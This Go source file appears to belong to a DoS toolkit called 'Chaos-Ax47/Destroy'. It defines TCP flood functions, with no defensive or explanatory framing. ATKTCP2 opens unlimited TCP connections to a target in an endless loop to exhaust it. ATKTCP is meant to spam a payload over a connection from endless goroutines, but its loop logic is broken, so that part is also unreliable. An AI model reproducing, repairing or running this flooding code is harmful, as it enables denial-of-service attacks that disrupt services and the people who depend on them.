package atk

import (
	Rd "Chaos-Ax47/Destroy/Chaos-Package"
	// 	"syscall"
	"fmt"
	"net"
	"runtime"
	"time"
	// 	"os"
	// 	"strconv"
	// 	"strings"
)

func ATKTCP2(arguments string) {
	i := 1
	var conns []net.Conn
	for {

		fmt.Printf("ATk %d\n", i)

		for {
			c, e := net.Dial("tcp", arguments)
			i++
			if e != nil {
				fmt.Println(e)
				continue
			}

			conns = append(conns, c)
		}

	}
}
func cpu() int {
	maxProcs := runtime.GOMAXPROCS(0)
	numCPU := runtime.NumCPU()
	if maxProcs < numCPU {
		return maxProcs
	}
	return numCPU
}

func ATKTCP(arguments string) {
	var COn Rd.READER47
	e := COn.Starter()
	if e != nil {
		fmt.Println(e)
		return
	}
	TEXT, e := COn.GETSTRing()
	if e != nil {
		fmt.Println(e)
		return
	}
	c, err := net.Dial("tcp", arguments)
	if err != nil {
		fmt.Println(err)
		return
	}

	i := 1

	start := time.Now()
	for aaa := cpu(); aaa > runtime.NumCPU(); {
		if time.Since(start) < time.Second*10 {
			break
		}
		fmt.Printf("ATk %d\n CPU %d", i, aaa)
		go func(c net.Conn) {
			for {
				go c.Write([]byte(TEXT))
				i++

			}

		}(c)

	}
}
